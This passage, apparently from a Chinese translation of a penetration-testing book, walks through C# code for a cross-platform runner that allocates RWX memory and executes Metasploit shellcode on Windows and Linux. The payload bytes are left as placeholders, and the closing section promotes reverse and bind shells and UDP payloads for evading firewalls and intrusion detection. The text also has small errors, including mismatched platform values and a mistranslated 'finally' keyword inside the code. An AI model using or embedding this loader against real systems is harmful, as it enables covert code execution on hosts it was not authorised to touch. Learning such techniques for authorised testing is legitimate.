为了确定目标操作系统，我们捕获变量 Environment.OSVersion ➊，它有一个 Platform 属性，用于识别当前系统（如 if 语句中所使用）。为了确定目标架构，我们将 IntPtr 的大小与数字 4 ➋ 进行比较，因为在 32 位系统中，指针是 4 字节长，但在 64 位系统中，它是 8 字节长。我们知道，如果 IntPtr 大小是 4，我们就是 32 位系统；否则，我们假设系统是 64 位的。我们还声明了一个字节数组 payload 来保存我们生成的负载。

现在我们可以设置我们的本地程序集负载。如果当前操作系统匹配一个 Windows 平台 ID ➌（已知的平台和操作系统版本列表），我们会根据系统架构将一个字节数组分配给 payload 变量。

为了分配执行原始汇编代码所需的内存，我们将四个参数传递给 VirtualAlloc() ➍。第一个参数是 IntPtr.Zero，告诉 VirtualAlloc() 在第一个可用的位置分配内存。第二个参数是要分配的内存大小，它等于当前有效负载的长度。此参数被转换为非托管函数可以理解的 IntPtr 类，以便为我们的有效负载分配足够的内存。

第三个参数是 kernel32.dll 中定义的一个魔法值，映射到 MEM_COMMIT 选项，告诉 VirtualAlloc() 立即分配内存。这个参数定义了内存分配的模式。最后，0x40 是 kernel32.dll 中定义的一个魔法值，映射到我们需要的 RWX（读、写和执行）模式。VirtualAlloc() 函数将返回一个指向新分配内存的指针，以便我们知道分配的内存区域开始的位置。

现在，Marshal.Copy() ➎ 将我们的有效负载直接复制到分配的内存空间中。传递给 Marshal.Copy() 的第一个参数是我们想要复制到分配内存的字节数组。第二个参数是字节数组中开始复制的索引，第三个参数是开始复制到的位置（使用 VirtualAlloc() 函数返回的指针）。最后一个参数是我们想要从字节数组中复制到分配内存的字节数（全部）。

接下来，我们通过使用在 MainClass 顶部定义的 WindowsRun 委托，将汇编代码作为非托管函数指针进行引用。我们使用 Marshal.GetDelegateForFunctionPointer() 方法 ➏，通过将指向汇编代码开始位置的指针和委托类型分别作为第一个和第二个参数，创建一个新的委托。我们将此方法返回的委托转换为我们的 WindowsRun 委托类型，然后将其赋值给一个新的相同类型的 WindowsRun 变量。现在，只需要像调用函数一样调用此委托，执行我们复制到内存中的汇编代码。

执行本机 Linux 有效负载

在本节中，我们将介绍如何定义可以一次编译并在 Linux 和 Windows 上运行的有效负载。但首先，我们需要从 libc 导入一些函数，并定义我们的 Linux 非托管函数委托，如清单 4-27 所示。

> [DllImport("libc")]
> 
> static extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);
> 
> [DllImport("libc")]
> 
> static extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr size);
> 
> [DllImport("libc")]
> 
> static extern void free(IntPtr ptr);
> 
> [UnmanagedFunctionPointer(➊CallingConvention.Cdecl)]
> 
> delegate void ➋LinuxRun(); 清单 4-27：设置有效负载以运行生成的 Metasploit 有效负载

我们在靠近 Windows 函数导入的 MainClass 顶部添加了清单 4-27 中显示的行。我们从 libc 导入了三个函数——mprotect()、posix_memalign() 和 free()——并定义了一个新的委托叫做 LinuxRun ➋。它具有 UnmanagedFunctionPointer 属性，就像我们的 WindowsRun 委托一样。然而，和清单 4-25 中使用 CallingConvention.StdCall 不同，我们传递 CallingConvention.Cdecl ➊，因为 cdecl 是类 Unix 系统中的本地函数调用约定。

在清单 4-28 中，我们现在向 Main() 方法添加了一个 else if 语句，紧接着测试是否在 Windows 机器上的 if 语句（参见清单 4-26 中的 ➌）。

> else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128)
> 
> {
> 
> if (!x86)
> 
> payload = new byte[] { [... X86-64 LINUX PAYLOAD GOES HERE ...] };
> 
> else
> 
> payload = new byte[] { [... X86 LINUX PAYLOAD GOES HERE ...] }; 清单 4-28: 检测平台并分配相应的负载

来自微软的原始 PlatformID 枚举没有包括非 Windows 平台的值。随着 Mono 的发展，已经引入了类 Unix 系统的非官方 Platform 属性值，因此我们直接将 Platform 的值与魔术整数值进行比较，而不是使用明确定义的枚举值。值 4、6 和 128 可用于确定我们是否在类 Unix 系统上运行。将 Platform 属性转换为 int 使我们能够将 Platform 值与整数值 4、16 和 128 进行比较。

一旦我们确定在类 Unix 系统上运行，我们就可以设置执行本地汇编负载所需的值。根据当前的架构，负载字节数组将被分配为我们的 x86 或 x86-64 负载。

分配内存

现在，我们开始分配内存以将汇编代码插入内存，如清单 4-29 所示。

> IntPtr ptr = IntPtr.Zero;
> 
> IntPtr success = IntPtr.Zero;
> 
> bool freeMe = false;
> 
> try
> 
> {
> 
> int pagesize = 4096;
> 
> IntPtr length = (IntPtr)payload.Length;
> 
> success = ➊posix_memalign(ref ptr, (IntPtr)32, length);
> 
> if (success != IntPtr.Zero)
> 
> {
> 
> Console.WriteLine("Bail! memalign failed: " + success);
> 
> return;
> 
> }

清单 4-29: 使用 posix_memalign() 分配内存

首先，我们定义几个变量：ptr，它应该在分配成功后由 posix_memalign()分配到我们的内存开始位置；success，它将被分配为 posix_memalign()返回的值（如果分配成功）；以及布尔值 freeMe，当分配成功时为 true，这样我们就知道何时需要释放已分配的内存。（如果分配失败，我们将 freeMe 赋值为 false。）接下来，我们开始一个 try 块以开始分配，以便我们能捕获任何异常，并在发生错误时优雅地退出有效载荷。我们将一个名为 pagesize 的新变量设置为 4096，这是大多数 Linux 安装的默认内存页面大小。

在分配了一个名为 length 的新变量，它包含了我们的有效载荷长度（转换为 IntPtr 类型）后，我们通过引用传递 ptr 变量来调用 posix_memalign() ➊，以便 posix_memalign()可以直接修改值，而无需将其传回。我们还传递了内存对齐（始终是 2 的倍数，32 是一个不错的值）和我们要分配的内存量。如果分配成功，posix_memalign()函数将返回 IntPtr.Zero，所以我们需要进行检查。如果没有返回 IntPtr.Zero，我们会打印一条关于 posix_memalign()失败的消息，然后返回并退出有效载荷。如果分配成功，我们将已分配内存的模式更改为可读、可写和可执行，详见 Listing 4-30。

> freeMe = true;
> 
> IntPtr alignedPtr = ➊(IntPtr)((int)ptr & ~(pagesize - 1)); //获取页面边界
> 
> IntPtr ➋mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- 注意 selinux
> 
> success = ➌mprotect(alignedPtr, (IntPtr)32, mode);
> 
> if (success != IntPtr.Zero)
> 
> {
> 
> Console.WriteLine("失败！mprotect 失败");
> 
> return;
> 
> }

Listing 4-30: 更改已分配内存的模式

注意

> 在 Linux 上实现 shellcode 执行的技术在限制分配 RWX 内存的操作系统上不起作用。例如，如果你的 Linux 发行版启用了 SELinux，这些示例可能无法在你的机器上运行。基于这个原因，我推荐使用 Ubuntu——因为 SELinux 不存在，示例应该能顺利运行。

为了确保稍后能够释放分配的内存，我们将 freeMe 设置为 true。接下来，我们使用 posix_memalign()在分配过程中设置的指针（ptr 变量），并通过对指针与页面大小的补码进行按位与操作，创建一个页面对齐的指针。这样，补码实际上将我们的指针地址转换为负数，从而使我们在设置内存权限时的数学计算正确。

由于 Linux 以页面为单位分配内存，我们必须更改我们有效载荷内存分配所在的整个内存页的模式。与当前页面大小的补码按位与运算将 posix_memalign()给出的内存地址向下舍入到指针所在的内存页面的起始位置。这使我们能够为 posix_memalign()分配的内存使用的整个内存页设置模式。

我们还通过对值 0x04（读取）、0x02（写入）和 0x01（执行）执行按位或运算来创建设置内存的模式，并将按位或运算的结果存储在 mode 变量中 ➋。最后，我们通过传递内存页面的对齐指针、内存对齐方式（传递给 posix_memalign()函数）以及设置内存的模式来调用 mprotect() ➌。与 posix_memalign()函数类似，如果 mprotect()成功更改了内存页面的模式，则返回 IntPtr.Zero。如果没有返回 IntPtr.Zero，我们将打印错误信息并返回以退出有效载荷。

复制并执行有效载荷

现在，我们已经准备好将有效载荷复制到内存空间并执行代码，如清单 4-31 所示。

> ➊Marshal.Copy(payload, 0, ptr, payload.Length);
> 
> LinuxRun r = (LinuxRun)➋Marshal.GetDelegateForFunctionPointer(ptr, typeof(LinuxRun));
> 
> r();
> 
> }
> 
> 最终
> 
> {
> 
> if (freeMe)
> 
> ➌free(ptr);
> 
> }
> 
> }

清单 4-31：将有效载荷复制到分配的内存并执行有效载荷

清单 4-31 的最后几行代码应该类似于我们编写的执行 Windows 有效载荷的代码（清单 4-26）。Marshal.Copy()方法 ➊ 将我们的有效载荷复制到分配的内存缓冲区中，而 Marshal.GetDelegateForFunctionPointer()方法 ➋ 将内存中的有效载荷转换为我们可以从托管代码中调用的委托。一旦我们有了指向内存中代码的委托，我们就可以调用它以执行代码。紧跟着 try 块的 finally 块会释放由 posix_memalign()分配的内存，前提是 freeMe 设置为 true ➌。

最后，我们将生成的 Windows 和 Linux 有效载荷添加到跨平台有效载荷中，这使我们能够在 Windows 或 Linux 上编译并运行相同的有效载荷。

结论

在本章中，我们讨论了几种不同的方法来创建在各种情况下有用的自定义有效载荷。

使用 TCP 的有效载荷在攻击网络时可以带来好处，从从内部网络获取 Shell 到维持持久性。通过使用回连技术，你可以在远程主机上获得 Shell，从而有助于例如网络钓鱼活动，在这种活动中，渗透测试完全是外部的。另一方面，绑定技术可以帮助你在不必再次利用机器上的漏洞的情况下，在主机上维持持久性，前提是可以访问内部网络。

通过 UDP 通信的有效载荷通常能够绕过配置不当的防火墙，并且可能能够避开专注于 TCP 流量的入侵检测系统。尽管比 TCP 不那么可靠，UDP 提供的速度和隐蔽性是 TCP 无法提供的，尤其是在严格审查的情况下。通过使用一个监听传入广播的 UDP 有效载荷，尝试执行发送的命令，然后将结果广播回你，你的攻击可能会变得更加安静，也许会更加隐蔽，尽管在稳定性上有所牺牲。

Metasploit 允许攻击者快速创建多种类型的有效载荷，并且安装和运行都非常简单。Metasploit 包含 msfvenom 工具，能够创建并编码用于漏洞利用的有效载荷。使用 msfvenom 工具生成本地汇编有效载荷后，你可以构建一个小型的跨平台可执行文件，用于检测并运行各种操作系统的 shellcode。这为你在目标主机上运行有效载荷提供了极大的灵活性。它还利用了 Metasploit 中最强大、最有用的功能之一。
